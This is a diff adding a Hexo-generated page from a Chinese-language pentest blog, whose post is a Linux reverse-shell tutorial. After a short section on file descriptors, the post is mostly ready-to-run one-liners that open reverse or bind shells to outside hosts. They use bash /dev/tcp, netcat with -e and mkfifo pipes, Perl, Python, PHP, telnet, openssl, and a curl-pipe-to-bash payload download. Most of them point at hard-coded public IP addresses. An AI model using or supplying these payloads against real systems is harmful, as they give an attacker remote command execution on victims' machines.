@@ -1,0 +1,777 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="title: linux反弹shelldate: 2025-02-17 23:20:36tags: 渗透 web安全-linux反弹shelllinux文件描述符  文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件  文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容  在Linux系统中内核默认为每个进程创建三个标准的文件描述符：0（标准输入）、1（标准输出）、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AU9U5T">
+<meta property="og:url" content="https://tsy244.github.io/2025/02/17/%E6%B8%97%E9%80%8F/linux%E5%8F%8D%E5%BC%B9shell/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="title: linux反弹shelldate: 2025-02-17 23:20:36tags: 渗透 web安全-linux反弹shelllinux文件描述符  文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件  文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容  在Linux系统中内核默认为每个进程创建三个标准的文件描述符：0（标准输入）、1（标准输出）、">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826090524816.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091742826.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091803283.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091837807.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091936362.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111509035.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111624663.png">
+<meta property="article:published_time" content="2025-02-17T15:20:36.013Z">
+<meta property="article:modified_time" content="2025-02-17T16:11:00.783Z">
+<meta property="article:author" content="August Rosenberg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826090524816.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-17 23:20" pubdate>
+          February 17, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="title-linux反弹shell"><a href="#title-linux反弹shell" class="headerlink" title="title: linux反弹shell"></a>title: linux反弹shell</h3><p>date: 2025-02-17 23:20:36<br>tags: 渗透</p>
+<h1 id="web安全-linux反弹shell"><a href="#web安全-linux反弹shell" class="headerlink" title="web安全-linux反弹shell"></a>web安全-linux反弹shell</h1><h2 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h2><p>  文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件  文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容  在Linux系统中内核默认为每个进程创建三个标准的文件描述符：0（标准输入）、1（标准输出）、2（标准错误）</p>
+<p>  通过查看 <code>/proc/PID/fd </code>目录下的文件，就可以查看每个进程拥有的所有文件描述符  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826090524816.png" srcset="/img/loading.gif" lazyload alt="image-20230826090524816"></p>
+<p>255是一个小技巧，bash用于在重定向时保留这些副本</p>
+<p>当打开文件时，系统内核会为特定的进程自动创建对应的文件描述符，也就是说每一个进程的输入输出error不一样，不同的进程打开同一个文件时，它们的文件描述符可能不同，但同一个进程打开同一个文件时，它们的文件描述符是相同的。</p>
+<h2 id="linux文件描述符操作"><a href="#linux文件描述符操作" class="headerlink" title="linux文件描述符操作"></a>linux文件描述符操作</h2><p>以下操作只针对某一个进程</p>
+<ol>
+<li><p>更改标准输出位置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 1&gt; test<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091742826.png" srcset="/img/loading.gif" lazyload alt="image-20230826091742826"></p>
+</li>
+<li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091803283.png" srcset="/img/loading.gif" lazyload alt="image-20230826091803283"></p>
+</li>
+<li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091837807.png" srcset="/img/loading.gif" lazyload alt="image-20230826091837807"></p>
+</li>
+<li><p>&#x2F;dev&#x2F;null</p>
+<p>特殊文件，写入的任何东西都会被清空</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091936362.png" srcset="/img/loading.gif" lazyload alt="image-20230826091936362"></p>
+</li>
+</ol>
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><p>bash反弹shell，只针对bash</p>
+<p>由于外网机无法访问到内网机，但是内网机能ping外网机，于是使用反弹shell的方式，帮助外网机获得内网机的shell得到</p>
+<p>反弹shell，就是可以理解为，外网可以执行内网机的shell，这里是bash</p>
+<p>第一步首先让控制端监听端口</p>
+<blockquote>
+<p>nc -lvvp 6666（端口）</p>
+</blockquote>
+<p>第二步</p>
+<blockquote>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;被控端ip&#x2F;与控制端相同的端口 0&gt;&amp;1</p>
+</blockquote>
+<p>0&gt;&amp;1的意思是，本地的输出也输出给控制端，有点像发送信息</p>
+<p>参数讲解</p>
+<blockquote>
+<p>  bash -i  打开一个交互式的bash shell。  </p>
+<p>  &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT  </p>
+<p>  &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash  实现的用来实现网络请求的一个接口。  打开这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket  连接中传输数据。  </p>
+<p>  &#x2F;dev&#x2F;tcp&#x2F;192.168.81.154&#x2F;6666  </p>
+<p>  和192.168.81.154的6666端口建立TCP连接</p>
+</blockquote>
+<h2 id="Linux反弹shell的其他方法"><a href="#Linux反弹shell的其他方法" class="headerlink" title="Linux反弹shell的其他方法"></a>Linux反弹shell的其他方法</h2><h3 id="NC3"><a href="#NC3" class="headerlink" title="NC3"></a>NC3</h3><ol>
+<li><p>NC正向反弹</p>
+<p>正向的意思，由控制端主动发出请求，用于控制端能连接上被控端就行</p>
+<p>但是注意有可能nc不支持-e参数</p>
+<blockquote>
+<p>  被控端：  </p>
+<p>  nc -lvvp 6666 -e &#x2F;bin&#x2F;sh  </p>
+<p>  控制端：  </p>
+<p>  nc 10.10.1.7 6666  </p>
+<p>  原  </p>
+<p>  理：  </p>
+<p>  被控端使用nc将&#x2F;bin&#x2F;sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell  </p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111509035.png" srcset="/img/loading.gif" lazyload alt="image-20230826111509035"></p>
+</li>
+<li><p>NC反向shell</p>
+<p>当被控端能够访问控制端的时候使用</p>
+<blockquote>
+<p>  控制端：  </p>
+<p>  nc -lvvp 6666  </p>
+<p>  被控端：  </p>
+<p>  nc -e &#x2F;bin&#x2F;sh 10.10.1.11 6666  </p>
+<p>  原理：  </p>
+<p>  被控端使用nc将&#x2F;bin&#x2F;sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111624663.png" srcset="/img/loading.gif" lazyload alt="image-20230826111624663"></p>
+<p>无e参数，反弹shell,有些情况下nc 指令没有-e的参数，就是用下面的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 139.155.49.43 6666 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  mkﬁfo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给&#x2F;bin&#x2F;sh，sh会执行管道里的  命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。  </p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mknod backpipe p; nc 47.101.214.85 6666 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><p>控制端使用nc 监听即可</p>
+<p>下面都是被控端的脚本</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;47.101.214.85&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -MIO -e <span class="hljs-string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;47.101.214.85:6666&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>主要是利用控制端，开一个server ，作为临时文件服务器</p>
+<p>然后读取这个文件之后执行</p>
+<p>文件服务器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@VM-0-2-ubuntu:~# cat index.html<br>bash -i &gt;&amp; /dev/tcp/139.155.49.43/6666 0&gt;&amp;1<br><br>root@VM-0-2-ubuntu:~# python3 -m http.server<br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br>47.101.214.85 - - [03/Dec/2020 09:21:39] &quot;GET /index.html HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure>
+
+<p>被控端</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-number">139.155</span>.<span class="hljs-number">49.43</span>:<span class="hljs-number">8000</span><span class="hljs-string">|bash</span><br>或<br>curl http:<span class="hljs-comment">//139.155.49.43:8000/index.html|bash</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>控制端使用nc 监听即可</p>
+<p>被控端</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;47.101.214.85&quot;</span>,<span class="hljs-number">6666</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>控制端使用nc 监听即可</p>
+<p>被控端</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;47.101.214.85&quot;</span>,<span class="hljs-number">7777</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure>
+
+<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">攻击机：</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-lvvp</span> <span class="hljs-number">5555</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-lvvp</span> <span class="hljs-number">6666</span><br><br><span class="hljs-string">目标机：</span> <br><span class="hljs-string">telnet</span> <span class="hljs-number">47.101</span><span class="hljs-number">.214</span><span class="hljs-number">.85</span> <span class="hljs-number">5555</span> <span class="hljs-string">|</span> <span class="hljs-string">/bin/bash</span> <span class="hljs-string">|</span> <span class="hljs-string">telnet</span> <span class="hljs-number">47.101</span><span class="hljs-number">.214</span><span class="hljs-number">.85</span> <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击机：<br>nc -lvvp 6666<br><br>目标机：<br><span class="hljs-built_in">rm</span> -f a &amp;&amp; <span class="hljs-built_in">mknod</span> a p &amp;&amp; telnet 47.101.214.85 6666 0&lt;a | /bin/bash 1&gt;a<br><span class="hljs-built_in">rm</span> -f a;<span class="hljs-built_in">mknod</span> a p;telnet 47.101.214.85 6666 0&lt;a | /bin/bash 1&gt;a<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h3><p>反弹的是443 端口，并且传输的流量还是加密的</p>
+<ol>
+<li><p>远程攻击主机生产密钥文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> req -x509 -newkey rsa:<span class="hljs-number">4096</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>远程攻击主机上启动监视器</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">openssl s_server -quiet -<span class="hljs-type">key</span> <span class="hljs-type">key</span>.pem -cert cert.pem -port <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在目标机上反弹shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkfifo <span class="hljs-regexp">/tmp/</span>s; <span class="hljs-regexp">/bin/</span>sh -i &lt; <span class="hljs-regexp">/tmp/</span>s <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; <span class="hljs-regexp">/tmp/</span>s; rm <span class="hljs-regexp">/tmp/</span>s<br></code></pre></td></tr></table></figure></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://tsy244.github.io/2025/02/17/渗透/linux反弹shell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 17, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/02/18/linux%E5%8F%8D%E5%BC%B9shell/" title="linux反弹shell">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux反弹shell</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/15/%E5%85%8D%E6%9D%80/%E5%8A%A0%E5%AF%86%E5%A3%B3%E5%8E%9F%E7%90%86/" title="加密壳原理">
+                        <span class="hidden-mobile">加密壳原理</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
